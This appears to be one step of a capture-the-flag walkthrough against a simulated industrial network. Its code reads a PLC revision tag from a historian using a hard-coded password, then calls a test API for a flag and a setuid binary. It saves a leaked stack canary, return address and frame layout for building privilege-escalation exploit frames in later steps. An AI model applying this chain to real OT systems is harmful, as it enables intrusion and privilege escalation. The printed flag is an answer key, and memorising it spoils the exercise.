Requires W21.REVISION (process session from W09.4).

The collision-inputs handler requires the live PLC ProjectRevision tag value as an
integer. Read it from FUXA (`ProjectRevision` tag on AST-CRR-017) or from the OT
historian:

```python
import psycopg2
conn = psycopg2.connect(host="172.29.63.22", dbname="historian",
                        user="reader", password="yuVxToCIL3DxUeklDAbsjKWbAc8rs8pw")
with conn.cursor() as cur:
    cur.execute("""
        SELECT ph.value FROM public.process_history ph
        JOIN public.historian_tag_catalog c ON c.series = ph.tag
        WHERE ph.asset = 'AST-CRR-017' AND c.variable = 'ProjectRevision'
        ORDER BY ph.source_time DESC LIMIT 1
    """)
    project_revision = int(cur.fetchone()[0])
print("project_revision:", project_revision)   # 364
```

POST `/api/collision-inputs/current` via the engineering proxy with the process
session, passing the observed integer:

```python
import json, ssl, urllib.request, pathlib, base64

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("receipts/process-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc",
     "Content-Type": "application/json"}

d = json.loads(urllib.request.urlopen(
    urllib.request.Request(
        "https://process-view.arwc.test/api/collision-inputs/current",
        data=json.dumps({"operation": "materials", "project_revision": 364}).encode(),
        headers=h, method="POST"),
    context=ctx).read())
print("record_id:", d["record"]["record_id"])   # UTIL-CRR-ISSUER-R4
print("flag:", d["flag"])                        # FLAG{3f8005c9af25c506}

# Save the utility binary and relationship evidence for W28.2/W28.3.
pathlib.Path("/tmp/util-crr").write_bytes(base64.b64decode(d["utility_b64"]))
import json as _json
pathlib.Path("/tmp/util-relationship.json").write_text(_json.dumps(d["relationship"]))

# Save the status record — W28.2/W28.3 derive canary, PIE base, and session_id from it.
status = d["record"]["status"]
pathlib.Path("/tmp/util-status.json").write_text(_json.dumps(status))
print("session_id:          ", status["session_id"])
print("stack_canary (hex):  ", status["stack_canary"])
print("return_address (hex):", status["return_address"])
print("status_return_offset:", status["status_return_offset"])
```

A wrong or missing `project_revision` returns 409 "utility analysis request does
not match the engineering revision".

Returns the utility binary (ELF64 PIE with cap_setuid+ep), relationship evidence
(ELF offsets, frame layout, fixed vDSO base), ordinary invocations, seccomp
policy, and relocations. The `record["status"]` field contains the signed status
record with `session_id`, `stack_canary`, `return_address`, and
`status_return_offset` needed to build the frames in W28.2 and W28.3. Save all
of them; W28.2 and W28.3 derive the frame layout from `relationship["elf_offsets"]`
and `relationship["frame"]`.

Flag: `FLAG{3f8005c9af25c506}` in the top-level `flag` field.
